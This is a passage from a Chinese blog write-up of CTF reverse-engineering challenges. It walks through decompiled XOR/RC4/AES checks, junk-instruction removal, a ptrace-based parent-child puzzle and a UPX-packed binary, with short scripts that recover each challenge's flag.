src="https://img.dkdun.cn/v1/2024/12/89a3916d618ae9df.png"></p><p><code>enc</code> 函数的加密伪代码</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">__int64 __fastcall enc(char *<span class="hljs-built_in">a1</span>)<br>&#123;<br>  int i<span class="hljs-comment">; // [rsp+0h] [rbp-20h]</span><br>  int v3<span class="hljs-comment">; // [rsp+4h] [rbp-1Ch]</span><br><br>  v3 = __strlen_chk(<span class="hljs-built_in">a1</span>, -<span class="hljs-number">1</span>LL);<br>  for ( i = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; v3; ++i )</span><br>    <span class="hljs-built_in">a1</span>[i] ^= <span class="hljs-keyword">xork[i </span>% <span class="hljs-number">4</span>];<br>  return encc(<span class="hljs-keyword">xork, </span><span class="hljs-built_in">a1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>又看见一个 <code>encc</code> 加密函数，（太好了，又有个算法加密，我们有救了!）</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs smali">__int64 __fastcall encc(char *a1, char *a2)<br>&#123;<br>  unsigned __int64 v2; // rcx<br>  __int64 result; // rax<br>  unsigned __int8 v4; // [rsp+Ch] [rbp-34h]<br> <span class="hljs-built_in"> int </span>v5; // [rsp+14h] [rbp-2Ch]<br> <span class="hljs-built_in"> int </span>v6; // [rsp+18h] [rbp-28h]<br> <span class="hljs-built_in"> int </span>i; // [rsp+1Ch] [rbp-24h]<br><br>  init_sbox(a1);<br>  v5 = 0;<br>  v6 = 0;<br>  for ( i = 0; ; ++i )<br>  &#123;<br>    v2 = __strlen_chk(a2, -1<span class="hljs-class">LL);</span><br>    result = i;<br>   <span class="hljs-built_in"> if </span>( i &gt;= v2 )<br>      break;<br>    v6 = (v6 + 1) % 256;<br>    v5 = (sbox[v6] + v5) % 256;<br>    v4 = sbox[v6];<br>    sbox[v6] = sbox[v5];<br>    sbox[v5] = v4;<br>    a2[i] ^= sbox[(sbox[v5] + sbox[v6]) % 256];<br>  &#125;<br> <span class="hljs-built_in"> return </span>result;<br>&#125;<br></code></pre></td></tr></table></figure><p>一个异或，一个 RC4 加密，找到了异或的字符串 “meow” 和要解密的数据</p><p><img src="https://img.dkdun.cn/v1/2024/12/924ab39eead959c4.png"></p><p>解密流程：RC4-&gt;异或-&gt;Base64-&gt;AES</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">char</span> sbox[<span class="hljs-number">257</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">char</span> xork[] = <span class="hljs-string">&quot;meow&quot;</span>;<br><span class="hljs-comment">//s盒</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">init_sbox</span><span class="hljs-params">(<span class="hljs-type">char</span>*a1)</span>&#123;<br>  <span class="hljs-type">int</span> i,j,k,tmp;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100</span>; i++ )<br>    sbox[i] = i;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100</span>; i++ )<br>  &#123;<br>    tmp = sbox[i];<br>    j = (a1[k] + tmp + j) % <span class="hljs-number">256</span>;<br>    sbox[i] = sbox[j];<br>    sbox[j] = tmp;<br>    <span class="hljs-keyword">if</span> ( ++k &gt;= <span class="hljs-built_in">strlen</span>(a1))<br>      k = <span class="hljs-number">0</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">//解密 RC4</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">encc</span><span class="hljs-params">(<span class="hljs-type">char</span> *a1,<span class="hljs-type">char</span>*data)</span>&#123;<br>  init_sbox(a1);<br>  <span class="hljs-type">int</span> i,j,k,tmp;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>;i&lt;<span class="hljs-built_in">strlen</span>(data) ; i++ )<br>  &#123;<br>    j = (j + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>    k = (sbox[j] + k) % <span class="hljs-number">256</span>;<br>    tmp = sbox[j];<br>    sbox[j] = sbox[k];<br>    sbox[k] = tmp;<br>    data[i] ^= sbox[(sbox[j] + sbox[k]) % <span class="hljs-number">256</span>];<br>  &#125;<br>&#125;<br><span class="hljs-comment">//异或</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">enc</span><span class="hljs-params">(<span class="hljs-type">char</span> *a1)</span>&#123;<br><span class="hljs-type">int</span> i;<br>    <span class="hljs-type">int</span> len=<span class="hljs-built_in">strlen</span>(a1);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; len; ++i )<br>    a1[i] ^= xork[i % <span class="hljs-number">4</span>];<br>  encc(xork, a1);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-type">char</span> mm[]=&#123;<span class="hljs-number">0xC2</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x81</span>, <br>  <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x04</span>,<br>  <span class="hljs-number">0x32</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x3D</span>,<br>  <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x5D</span>&#125;;<br>  enc(mm);<br>  <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">44</span>;i++)&#123;<br>    <span class="hljs-built_in">putchar</span>(mm[i]);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>AES 密钥是&#96;&#96;MainActivity.title&#96; 也就是 “IamEzEncryptGame” ，厨子梭出来</p><p><img src="https://img.dkdun.cn/v1/2024/12/9fbf4e8780ac5eba.png"></p><h1 id="Dirty-flowers"><a href="#Dirty-flowers" class="headerlink" title="Dirty_flowers"></a>Dirty_flowers</h1><p>不能 f5，有花指令，那就按下 space 键看文本流程，直接将 push-pop 的指令也就是 <code>0x4012f1~0x401302</code> 的指令全部 nop 掉 ,然后在 <code>main</code> 函数头按下 U 和 P 重新编译</p><p><img src="https://img.dkdun.cn/v1/2024/12/80a38a07ee4a66f3.png"></p><p>伪代码大概流程：输入 36 长度字符串，进入 <code>sub_401100</code> 加密，再与 <code>sub_4011D0</code> 判断</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(v4) == <span class="hljs-number">36</span> )<br>  &#123;<br>    sub_401100(v4, <span class="hljs-number">36</span>);<br>    <span class="hljs-keyword">if</span> ( sub_4011D0(v4, <span class="hljs-number">36</span>) )<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;success!\n&quot;</span>);<br>    <span class="hljs-keyword">else</span><br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;no!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;wrong length!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br></code></pre></td></tr></table></figure><p><code>sub_401100</code> 也有花指令，和上面的一样流程来去花</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">signed</span> <span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_401100</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2)</span><br>&#123;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// kr00_4</span><br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+1Ch] [ebp-1Ch]</span><br>  <span class="hljs-type">char</span> v5[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [esp+24h] [ebp-14h] BYREF</span><br><br>  <span class="hljs-built_in">strcpy</span>(v5, <span class="hljs-string">&quot;dirty_flower&quot;</span>);<br>  v2 = <span class="hljs-built_in">strlen</span>(v5);<br>  result = v2;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; a2; ++i )<br>  &#123;<br>    result = i + a1;<br>    *(_BYTE *)(i + a1) ^= v5[i % v2];<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>sub_4011D0</code> 函数比较内容大概是：（我比较喜欢看汇编流程图，感觉比伪代码更方便 :) 嘻嘻）</p><p><img src="https://img.dkdun.cn/v1/2024/12/ba83c2581a55c526.png"></p><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">enc = [<span class="hljs-number">0x02</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x5c</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x43</span>,<br>       <span class="hljs-number">0x07</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x32</span>,<br>       <span class="hljs-number">0x55</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x00</span>]<br><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;dirty_flower&quot;</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>    enc[i] ^= <span class="hljs-built_in">ord</span>(<span class="hljs-built_in">str</span>[i % <span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>)])<br>    flag += <span class="hljs-built_in">chr</span>(enc[i])<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h1 id="Ptrace"><a href="#Ptrace" class="headerlink" title="Ptrace"></a>Ptrace</h1><p>ida 居然还能反编译<code>.txt</code> ，真的是 tql。第一次见这种类型的题目，看 wp 理解了半天，复现了俩小时（</p><p>记得将 <code>son.txt</code> 和 <code>father.txt</code> 放在同一目录下，打开 <code>father.txt</code>  文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [esp-14h] [ebp-30h]</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp-10h] [ebp-2Ch]</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [esp-Ch] [ebp-28h]</span><br>  <span class="hljs-type">int</span> v7; <span class="hljs-comment">// [esp-8h] [ebp-24h]</span><br>  <span class="hljs-type">int</span> v8; <span class="hljs-comment">// [esp-4h] [ebp-20h]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> **v9; <span class="hljs-comment">// [esp+0h] [ebp-1Ch]</span><br>  <span class="hljs-type">char</span> stat_loc[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+8h] [ebp-14h] BYREF</span><br>  <span class="hljs-type">__pid_t</span> v11; <span class="hljs-comment">// [esp+Ch] [ebp-10h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v12; <span class="hljs-comment">// [esp+10h] [ebp-Ch]</span><br>  <span class="hljs-type">int</span> *p_argc; <span class="hljs-comment">// [esp+14h] [ebp-8h]</span><br><br>  p_argc = &amp;argc;<br>  v9 = argv;<br>  v12 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please input your flag:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%32s&quot;</span>, &amp;s, v4, v5, v6, v7, v8, v9);<br>  v11 = fork();<span class="hljs-comment">// 创建子进程</span><br>  <span class="hljs-keyword">if</span> ( v11 )<br>  &#123;<span class="hljs-comment">//父进程</span><br>    <span class="hljs-keyword">if</span> ( v11 &lt;= <span class="hljs-number">0</span> )<br>    &#123;<br>      perror(<span class="hljs-string">&quot;fork&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    wait(stat_loc);<br>    ptrace(PTRACE_POKEDATA, addr, addr, <span class="hljs-number">3</span>);<br>    ptrace(PTRACE_CONT, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    wait(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<span class="hljs-comment">//子进程</span><br>    ptrace(PTRACE_TRACEME, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    execl(<span class="hljs-string">&quot;./son&quot;</span>, <span class="hljs-string">&quot;son&quot;</span>, &amp;s, <span class="hljs-number">0</span>); <span class="hljs-comment">//把 s 作为新进程的参数</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>对于<code>fork()</code>、<code>execl()</code> 函数：都是 Linux 中的进程控制函数</p><p><code>fork()</code>：创建新的进程，该进程几乎相当于当前进程的一个完全拷贝</p><p><code>execl()</code>：是函数族 <code>exec()</code> 之一，用来启动另外的进程以取代当前运行的进程</p><p><code>execl()</code> 四个参数</p><table><thead><tr><th>参数</th><th>变量类型</th><th>解释</th></tr></thead><tbody><tr><td>绝对路径</td><td>const char*</td><td>文件存储路径</td></tr><tr><td>标识符</td><td>const char*</td><td>大多数时候是文件名</td></tr><tr><td>参数</td><td>——</td><td>选项</td></tr><tr><td>NULL</td><td>——</td><td>NULL</td></tr></tbody></table><p>所以 <code>main()</code> 函数中流程：<code>fork()</code> 创建子进程，返回的 <code>pid</code> 就是 <code>v11</code>，<code>v11</code>&gt;0 为父进程，<code>v11=0</code> 为子进程，子进程中使用了 <code>execl()</code> 函数，启动当前目录下的 <code>son</code> 文件，传入 <code>s</code> 作为新进程的参数，这里的新进程替换掉之前的子进程，使自己变成子进程。</p><p>打开 <code>son.txt</code> 查看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_600011AD</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2)</span><br>&#123;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+2h] [ebp-28h]</span><br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> j; <span class="hljs-comment">// [esp+6h] [ebp-24h]</span><br>  <span class="hljs-type">char</span> *s; <span class="hljs-comment">// [esp+Ah] [ebp-20h]</span><br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [esp+Eh] [ebp-1Ch]</span><br><br>  s = *(<span class="hljs-type">char</span> **)(a2 + <span class="hljs-number">4</span>);<br>  v6 = <span class="hljs-built_in">strlen</span>(s);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v6; ++i )<br>    byte_60004080[i] = ((<span class="hljs-type">int</span>)(<span class="hljs-type">unsigned</span> __int8)s[i] &gt;&gt; dword_60004040) | (s[i] &lt;&lt; (<span class="hljs-number">8</span> - dword_60004040));<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; v6; ++j )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( byte_60004080[j] != byte_60004020[j] )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;this is Wrong~&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;this is right~&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的 <code>s = *(char **)(a2 + 4)</code>，其实它就是指向 <code>father</code> 传入的 <code>s</code>。<code>execl</code> 执行的命令为 <code>./son s</code>，而对于 <code>son</code> 文件的主函数而言，第一个参数是 <code>a1</code> 表示执行命令参数的个数，这里就是 2，而后面的 <code>a2</code> 真实类型为 <code>const char*</code>，代表的就是命令的各个参数，所以这里的 <code>a2 + 4</code> 执行的就是第二个参数，也就是 <code>s</code>.</p><p><img src="https://img.dkdun.cn/v1/2024/12/d178e014557fc4c8.png"></p><p>大概流程为：将 <code>s</code> 中的每个字节循环移位来进行变化，最后与密文进行比较</p><p>对于 <code>father</code> 文件的 <code>ptarce</code>，<code>ptrace</code> 是用于进程跟踪的，它提供了父进程可以观察和控制其子进程执行的能力，并允许父进程检查和替换子进程的内核镜像(包括寄存器)的值。其基本原理是: 当使用了<code>ptrace</code>跟踪后，所有发送给被跟踪的子进程的信号(除了<code>SIGKILL</code>)，都会被转发给父进程，而子进程则会被阻塞，这时子进程的状态就会被系统标注为<code>TASK_TRACED</code>。而父进程收到信号后，就可以对停止下来的子进程进行检查和修改，然后让子进程继续运行。   </p><p>而这里查看子进程，可以发现使用 <code>ptrace(PTRACE_TRACEME, 0, 0, 0);</code>，它就是允许父进程对自身进行调试的语句，然后在父进程中，使用  <code>PTRACE_POKEDATA</code>  对数据进行修改，然后使用  <code>PTRACE_CONT</code>  让子进程继续执行。因此我们要关注的就是父进程对子进程的什么数据进行了修改</p><p>我们能看到有语句<code>ptrace(PTRACE_POKEDATA, addr, addr, 3);</code>，就是将 <code>addr</code> 所指向的地址进行了数据修改，更改为了 <code>3</code>，点进去 <code>addr</code> 指向的就是 <code>0x60004040</code> 位置的数据</p><p><img src="https://img.dkdun.cn/v1/2024/12/671a98df4e205869.png"></p><p>这个地址在 <code>son</code> 文件中也出现了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v6; ++i )<br>  byte_60004080[i] = ((<span class="hljs-type">int</span>)(<span class="hljs-type">unsigned</span> __int8)s[i] &gt;&gt; dword_60004040) | (s[i] &lt;&lt; (<span class="hljs-number">8</span> - dword_60004040));<br></code></pre></td></tr></table></figure><p>所以这个 <code>ptrace</code> 修改的是偏移值，将 4 改为了 3</p><p><img src="https://img.dkdun.cn/v1/2024/12/8470274afc084d5c.png"></p><p>因此，按照偏移 3 进行逆向变换，脚本</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">enc = [<span class="hljs-number">0xCC</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xED</span>,<br>       <span class="hljs-number">0xAE</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x6D</span>,<br>       <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xAC</span>,<br>       <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xAF</span>]<br>for i <span class="hljs-keyword">in</span> range(len(enc)):<br>    enc[i] = (enc[i] &lt;&lt; <span class="hljs-number">3</span> | enc[i] &gt;&gt; <span class="hljs-number">5</span>)&amp;<span class="hljs-number">0xff</span><br>    print(chr(enc[i]), end=<span class="hljs-string">&#x27;&#x27;)</span><br></code></pre></td></tr></table></figure><h1 id="UPX"><a href="#UPX" class="headerlink" title="UPX"></a>UPX</h1><p>看了下 wp 需要脱壳，但是我拿到的附件已经是脱好壳的了，所以直接看伪代码</p><p>一般进行 upx 脱壳方法</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">upx</span> -d <span class="hljs-string">&quot;文件路径&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> status; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please input your flag:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%22s&quot;</span>, s);<br>  RC4(s, key);<br>  <span class="hljs-keyword">for</span> ( status = <span class="hljs-number">0</span>; status &lt;= <span class="hljs-number">21</span>; ++status )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( s[status] != data[status] )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;this is Wrong~&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(status);<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;this is right~&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>输入的字符串长度为 <code>22</code>，然后进入 <code>RC4</code> 函数加密，后续进行 <code>for</code> 循环中，把<code>s</code> 和 <code>data</code> 进行比较</p><p>RC4 函数内容：</p><figure class="highlight 